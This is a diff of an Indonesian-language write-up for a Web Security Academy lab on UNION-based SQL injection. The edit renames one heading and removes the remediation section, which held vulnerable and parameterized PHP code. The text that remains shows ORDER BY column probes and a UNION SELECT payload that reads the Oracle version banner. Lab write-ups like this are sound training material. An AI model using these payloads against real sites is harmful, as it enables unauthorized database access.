@@ -19,7 +19,7 @@ Celah terjadi pada parameter filter kategori. Karena input dari pengguna langsun
 
 ## 2. Langkah Eksploitasi & PoC
 
-### A. Menentukan Jumlah Kolom Kueri Asli
+### Menentukan Jumlah Kolom Kueri Asli
 Sebelum menggunakan `UNION`, kita harus memastikan jumlah kolom yang dikembalikan oleh kueri asli sama dengan jumlah kolom kueri `UNION` kita. Saya menggunakan teknik `ORDER BY` pada parameter kategori di Burp Repeater:
 
 * `category=Gifts' ORDER BY 1--` (Status: 200 OK)
@@ -51,28 +51,3 @@ Host: 0a7b00fd04ad7e0180773a750036009d.web-security-academy.net
 SELECT * FROM products WHERE category = 'Accessories' UNION SELECT BANNER, null FROM v$version--' AND released = 1
 ```
 Hasil Akhir: Aplikasi menampilkan teks versi database Oracle (contoh: CORE 11.2.0.2.0 Production atau Oracle Database 11g Express Edition...) di layar browser. Lab berhasil diselesaikan (Solved).
-
----
-
-## 3. Rekomendasi Perbaikan
-Serangan UNION ini berhasil karena database mengeksekusi input pengguna sebagai bagian dari struktur kueri logika. Solusinya tetap wajib menggunakan Parameterized Queries (Prepared Statements).
-Contoh Implementasi Perbaikan Kode (PHP PDO Oracle/OCI):
-
-Daripada menggunakan kueri dinamis yang rentan:
-// KODE RENTAN (VULNERABLE)
-```
-$query = "SELECT * FROM products WHERE category = '" . $_GET['category'] . "' AND released = 1";
-$statement = oci_parse($conn, $query);
-oci_execute($statement);
-```
-
-Developer wajib mengubahnya menjadi aman menggunakan binding parameter:
-// KODE AMAN (SECURE)
-```
-$query = "SELECT * FROM products WHERE category = :category AND released = 1";
-$statement = oci_parse($conn, $query);
-
-// Melakukan binding input agar dianggap sebagai string murni, bukan perintah SQL
-oci_bind_by_name($statement, ":category", $_GET['category']);
-oci_execute($statement);
-```
